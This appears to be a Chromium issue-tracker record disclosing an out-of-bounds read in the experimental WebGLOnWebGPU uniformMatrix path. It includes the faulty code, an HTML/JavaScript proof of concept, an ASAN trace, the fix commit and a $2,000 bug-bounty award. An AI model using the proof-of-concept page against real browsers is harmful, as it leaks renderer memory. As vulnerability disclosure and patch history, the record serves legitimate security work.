# [WebGLOnWebGPU] Incorrect count passed to glUniformMatrix* functions

| Field | Value |
|-------|-------|
| **Issue ID** | [464725735](https://issues.chromium.org/issues/464725735) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>WebGPU |
| **Platforms** | Windows |
| **Reporter** | le...@gmail.com |
| **Assignee** | cw...@chromium.org |
| **Created** | 2025-11-30 |
| **Bounty** | $2,000.00 |

## Description

In src/third\_party/blink/renderer/modules/webgl/webgl\_rendering\_context\_webgpu\_base.cc,
several uniform*fv/iv/uiv overloads compute the count argument for glUniformMatrix*fv
based on the number of scalar components (floats/ints) in the input data.

However, the GL API interprets count as the number of matrices (or vectors), not the
number of scalar elements. For matrix uniforms, this causes count to be inflated by a
factor of the per-matrix component size (e.g., 4, 9, 16, etc.), leading ANGLE/GL to read
far more data than provided by the WebGL client.

This results in out-of-bounds reads from the renderer process' memory.

Problematic code example:

```
void WebGLRenderingContextWebGPUBase::uniformMatrix4fv(
    const WebGLUniformLocation* location,
    GLboolean transpose,
    base::span<const GLfloat> v,
    GLuint src_offset,
    GLuint src_length) {
  base::span<const GLfloat> data;
  if (!ValidateUniformV("uniformMatrix4fv", location, 16, v, src_offset,
                        src_length, &data)) {
    return;
  }
  driver_gl_.fn.glUniformMatrix4fvFn(location->Location(), data.size(),
                                     transpose, data.data());
}

```

PoC:

```
<!DOCTYPE html>
<html>
<body>
<canvas id="c" width="1" height="1"></canvas>
<script>
(async () => {
  const gl = document.getElementById('c').getContext('webgl2');
  if (!gl) throw new Error('need WebGL2');
  if (gl.initAsync) await gl.initAsync();

  const mkShader = (type, src) => {
    const s = gl.createShader(type);
    gl.shaderSource(s, src);
    gl.compileShader(s);
    if (!gl.getShaderParameter(s, gl.COMPILE_STATUS)) {
      throw new Error(gl.getShaderInfoLog(s));
    }
    return s;
  };

  const vs = mkShader(gl.VERTEX_SHADER, `#version 300 es
    uniform mat4 uM[32];
    void main() {
      gl_Position = uM[gl_VertexID] * vec4(0.0, 0.0, 0.0, 1.0);
    }`);

  const fs = mkShader(gl.FRAGMENT_SHADER, `#version 300 es
    precision mediump float;
    out vec4 col;
    void main() { col = vec4(1.0); }`);

  const prog = gl.createProgram();
  gl.attachShader(prog, vs);
  gl.attachShader(prog, fs);
  gl.linkProgram(prog);
  if (!gl.getProgramParameter(prog, gl.LINK_STATUS)) {
    throw new Error(gl.getProgramInfoLog(prog));
  }
  gl.useProgram(prog);

  const loc = gl.getUniformLocation(prog, 'uM[0]');
  const buf = new Float32Array(16);            // Here we only provide one 4x4 array
  gl.uniformMatrix4fv(loc, false, buf, 0, 16); // but tries to read srcLength=16 arrays
})();
</script>
</body>
</html>

```

ASAN Report:

```
=================================================================
==16988==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x01f8815e3cf0 at pc 0x7ffe7e0cb14c bp 0x00626c3fd370 sp 0x00626c3fd3b8
READ of size 1024 at 0x01f8815e3cf0 thread T0
==16988==*** WARNING: Failed to initialize DbgHelp!              ***
==16988==*** Most likely this means that the app is already      ***
==16988==*** using DbgHelp, possibly with incompatible flags.    ***
==16988==*** Due to technical reasons, symbolization might crash ***
==16988==*** or produce wrong results.                           ***
    #0 0x7ffe7e0cb14b in _asan_memcpy+0x25b (c:\src\chromium\src\out\asan\clang_rt.asan_dynamic-x86_64.dll+0x18004b14b)
    #1 0x7ffd3e49cdd8 in rx::SetFloatUniformMatrixGLSL<4,4>::Run c:\src\chromium\src\third_party\angle\src\libANGLE\renderer\renderer_utils.cpp:1057
    #2 0x7ffd3e49a693 in rx::SetUniformMatrixfv<4,4> c:\src\chromium\src\third_party\angle\src\libANGLE\renderer\renderer_utils.cpp:1493
    #3 0x7ffd3e955bb9 in rx::ProgramExecutableWgpu::setUniformMatrix4fv c:\src\chromium\src\third_party\angle\src\libANGLE\renderer\wgpu\ProgramExecutableWgpu.cpp:387
    #4 0x7ffd6650990a in GL_UniformMatrix4fv c:\src\chromium\src\third_party\angle\src\libGLESv2\entry_points_gles_2_0_autogen.cpp:5749
    #5 0x7ffd63cf8272 in blink::WebGLRenderingContextWebGPUBase::uniformMatrix4fv c:\src\chromium\src\third_party\blink\renderer\modules\webgl\webgl_rendering_context_webgpu_base.cc:3044
    #6 0x7ffd63dd01a3 in blink::`anonymous namespace'::v8_webgl2_rendering_context_webgpu::UniformMatrix4FvOperationOverload2 c:\src\chromium\src\out\asan\gen\third_party\blink\renderer\bindings\modules\v8\v8_webgl2_rendering_context_webgpu.cc:12952
    #7 0x7ffd63d99130 in blink::`anonymous namespace'::v8_webgl2_rendering_context_webgpu::UniformMatrix4FvOperationCallback c:\src\chromium\src\out\asan\gen\third_party\blink\renderer\bindings\modules\v8\v8_webgl2_rendering_context_webgpu.cc:12963
    #8 0x7ffd68638484 in Builtins_CallApiCallbackGeneric+0xc4 (c:\src\chromium\src\out\asan\chrome.dll+0x1ace88484)
    #9 0x7ffd686366a9 in Builtins_InterpreterEntryTrampoline+0x129 (c:\src\chromium\src\out\asan\chrome.dll+0x1ace866a9)
    #10 0x7ffd686786ad in Builtins_AsyncFunctionAwaitResolveClosure+0x2d (c:\src\chromium\src\out\asan\chrome.dll+0x1acec86ad)
    #11 0x7ffd68761d69 in Builtins_PromiseFulfillReactionJob+0x29 (c:\src\chromium\src\out\asan\chrome.dll+0x1acfb1d69)
    #12 0x7ffd68666cc6 in Builtins_RunMicrotasks+0x2c6 (c:\src\chromium\src\out\asan\chrome.dll+0x1aceb6cc6)
    #13 0x7ffd6863333e in Builtins_JSRunMicrotasksEntry+0xfe (c:\src\chromium\src\out\asan\chrome.dll+0x1ace8333e)
    #14 0x7ffd41470551 in v8::internal::`anonymous namespace'::Invoke c:\src\chromium\src\v8\src\execution\execution.cc:460
    #15 0x7ffd41473c29 in v8::internal::`anonymous namespace'::InvokeWithTryCatch c:\src\chromium\src\v8\src\execution\execution.cc:502
    #16 0x7ffd414740fb in v8::internal::Execution::TryRunMicrotasks c:\src\chromium\src\v8\src\execution\execution.cc:606
    #17 0x7ffd41511ed9 in v8::internal::MicrotaskQueue::RunMicrotasks c:\src\chromium\src\v8\src\execution\microtask-queue.cc:185
    #18 0x7ffd41513c47 in v8::internal::MicrotaskQueue::PerformCheckpoint c:\src\chromium\src\v8\src\execution\microtask-queue.h:48
    #19 0x7ffd495c22df in blink::scheduler::EventLoop::PerformMicrotaskCheckpoint c:\src\chromium\src\third_party\blink\renderer\platform\scheduler\common\event_loop.cc:75
    #20 0x7ffd495f320e in blink::scheduler::AgentGroupSchedulerImpl::PerformMicrotaskCheckpoint c:\src\chromium\src\third_party\blink\renderer\platform\scheduler\main_thread\agent_group_scheduler_impl.cc:118
    #21 0x7ffd49633b36 in blink::scheduler::MainThreadSchedulerImpl::PerformMicrotaskCheckpoint c:\src\chromium\src\third_party\blink\renderer\platform\scheduler\main_thread\main_thread_scheduler_impl.cc:1088
    #22 0x7ffd49644fb1 in blink::scheduler::MainThreadSchedulerImpl::OnTaskCompleted c:\src\chromium\src\third_party\blink\renderer\platform\scheduler\main_thread\main_thread_scheduler_impl.cc:2394
    #23 0x7ffd49662674 in blink::scheduler::MainThreadTaskQueue::OnTaskCompleted c:\src\chromium\src\third_party\blink\renderer\platform\scheduler\main_thread\main_thread_task_queue.cc:140
    #24 0x7ffd49665fbb in base::internal::Invoker<base::internal::FunctorTraits<void (blink::scheduler::MainThreadTaskQueue::*const &)(const base::sequence_manager::Task &, base::sequence_manager::TaskQueue::TaskTiming *, base::LazyNow *),blink::scheduler::MainThreadTaskQueue *>,base::internal::BindState<1,1,0,void (blink::scheduler::MainThreadTaskQueue::*)(const base::sequence_manager::Task &, base::sequence_manager::TaskQueue::TaskTiming *, base::LazyNow *),base::internal::UnretainedWrapper<blink::scheduler::MainThreadTaskQueue,base::unretained_traits::MayNotDangle,0> >,void (const base::sequence_manager::Task &, base::sequence_manager::TaskQueue::TaskTiming *, base::LazyNow *)>::Run c:\src\chromium\src\base\functional\bind_internal.h:979
    #25 0x7ffd547635da in base::sequence_manager::internal::TaskQueueImpl::OnTaskCompleted c:\src\chromium\src\base\task\sequence_manager\task_queue_impl.cc:1354
    #26 0x7ffd4f13634b in base::sequence_manager::internal::SequenceManagerImpl::NotifyDidProcessTask c:\src\chromium\src\base\task\sequence_manager\sequence_manager_impl.cc:915
    #27 0x7ffd4f135f68 in base::sequence_manager::internal::SequenceManagerImpl::DidRunTask c:\src\chromium\src\base\task\sequence_manager\sequence_manager_impl.cc:665
    #28 0x7ffd5477d1a6 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl c:\src\chromium\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:488
    #29 0x7ffd5477bea3 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork c:\src\chromium\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:346
    #30 0x7ffd547c37ee in base::MessagePumpDefault::Run c:\src\chromium\src\base\message_loop\message_pump_default.cc:42
    #31 0x7ffd5477ed1f in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run c:\src\chromium\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:647
    #32 0x7ffd4f1c3c3c in base::RunLoop::Run c:\src\chromium\src\base\run_loop.cc:134
    #33 0x7ffd525ab740 in content::RendererMain c:\src\chromium\src\content\renderer\renderer_main.cc:366
    #34 0x7ffd4bd26645 in content::RunOtherNamedProcessTypeMain c:\src\chromium\src\content\app\content_main_runner_impl.cc:765
    #35 0x7ffd4bd28a60 in content::ContentMainRunnerImpl::Run c:\src\chromium\src\content\app\content_main_runner_impl.cc:1131
    #36 0x7ffd4bd1ce05 in content::RunContentProcess c:\src\chromium\src\content\app\content_main.cc:346
    #37 0x7ffd4bd1d372 in content::ContentMain c:\src\chromium\src\content\app\content_main.cc:359
    #38 0x7ffd3b7b3068 in ChromeMain c:\src\chromium\src\chrome\app\chrome_main.cc:228
    #39 0x7ff6e36c4807 in MainDllLoader::Launch c:\src\chromium\src\chrome\app\main_dll_loader_win.cc:201
    #40 0x7ff6e36c2074 in main c:\src\chromium\src\chrome\app\chrome_exe_main_win.cc:351
    #41 0x7ff6e3bb66ef in __scrt_common_main_seh D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #42 0x7ffef73fe8d6 in BaseThreadInitThunk+0x16 (C:\Windows\System32\KERNEL32.DLL+0x18002e8d6)
    #43 0x7ffef7dcc53b in RtlUserThreadStart+0x2b (C:\Windows\SYSTEM32\ntdll.dll+0x18008c53b)

Address 0x0237815a78f0 is located in stack of thread T0 at offset 240 in frame
    #0 0x7ffd63dcf99f in blink::`anonymous namespace'::v8_webgl2_rendering_context_webgpu::UniformMatrix4FvOperationOverload2 c:\src\chromium\src\out\asan\gen\third_party\blink\renderer\bindings\modules\v8\v8_webgl2_rendering_context_webgpu.cc:12916

  This frame has 4 object(s):
    [32, 40) 'ref.tmp' (line 12921)
    [64, 104) 'exception_state' (line 12928)
    [144, 240) 'ref.tmp' (line 12937)
    [272, 288) 'agg.tmp' <== Memory access at offset 240 partially underflows this variable
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp, SEH and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow c:\src\chromium\src\third_party\angle\src\libANGLE\renderer\renderer_utils.cpp:1057 in rx::SetFloatUniformMatrixGLSL<4,4>::Run
Shadow bytes around the buggy address:
  0x0237815a7600: f1 f1 f1 f1 f8 f8 f2 f2 f8 f8 f8 f8 f8 f2 f2 f2
  0x0237815a7680: f2 f2 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f2 f2
  0x0237815a7700: f2 f2 f8 f8 f2 f2 f8 f2 f2 f2 f8 f3 f3 f3 f3 f3
  0x0237815a7780: f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3
  0x0237815a7800: f1 f1 f1 f1 f8 f2 f2 f2 00 00 00 00 00 f2 f2 f2
=>0x0237815a7880: f2 f2 00 00 00 00 00 00 00 00 00 00 00 00[f2]f2
  0x0237815a7900: f2 f2 00 00 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3
  0x0237815a7980: f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3
  0x0237815a7a00: f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5
  0x0237815a7a80: f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5
  0x0237815a7b00: f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

```

## Timeline

### cw...@chromium.org (2025-11-30)

Nice find! Though this is super experimental and barely tested code ^^' Out of curiosity, what brought you to try it and dig into it?

### le...@gmail.com (2025-12-01)

Haha yes, I can see this part is quite experimental. I've been looking into WebGL's implementation recently, and I noticed the WebGLOnWebGPU path while reading through the code. It seemed helpful for understanding the overall behavior, so I'm going through it and fixing edge cases as I encounter them.

### dx...@google.com (2025-12-01)

Project: chromium/src  

Branch:  main  

Author:  Wenxiang Qian [leonwxqian@gmail.com](mailto:leonwxqian@gmail.com)  

Link:    <https://chromium-review.googlesource.com/7206672>

[WebGLOnWebGPU] Fix incorrect count passed to glUniform\* entry points

---


Expand for full commit details
```
     
    These uniform entry points forwarded the raw element count (number of 
    floats/ints) as the GL `count` parameter. GL interprets `count` as the 
    number of vectors/matrices, so array uniforms caused out-of-bounds reads 
    when srcLength represented element count. 
     
    This CL sets the correct count for every uniform* call (including all 
    matrix shapes) by dividing the element count by the per-entry component 
    size. 
     
    Bug: 464725735 
    Change-Id: I438001193de1673b83ceb43503055006d32824bd 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7206672 
    Reviewed-by: Geoff Lang <geofflang@chromium.org> 
    Reviewed-by: Corentin Wallez <cwallez@chromium.org> 
    Commit-Queue: Geoff Lang <geofflang@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1552278}

```

---

Files:

- M `third_party/blink/renderer/modules/webgl/webgl_rendering_context_webgpu_base.cc`

---

Hash: [3147babd59bb1a7638334cbc27874f696c545ae1](https://chromiumdash.appspot.com/commit/3147babd59bb1a7638334cbc27874f696c545ae1)  

Date: Mon Dec 1 18:52:44 2025


---

### aj...@chromium.org (2025-12-16)

Sending to VRP for assessment.

### cw...@chromium.org (2025-12-16)

Unfortunately this is a prototype code path that requires various flags to be enabled so probably not elligible to the VRP.

### wf...@chromium.org (2025-12-16)

re: #6 is the intention that this code will ever be shipped in a future release of chrome? if so, then it's eligible for VRP since we like to find the bug(s) as early as possible before they ship to users. If not, then why is it landing in Chromium?

### cw...@chromium.org (2025-12-17)

My bad, the code is a prototype that is meant to grow into a full replacement for the current WebGL path and shipped eventually. I thought the "currently not stable" status prevented VRP but the rules seem to have changed!

### sp...@google.com (2025-12-18)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $2000.00 for this report.

Rationale for this decision:
baseline user information disclosure oob read


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-03-11)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/464725735)*
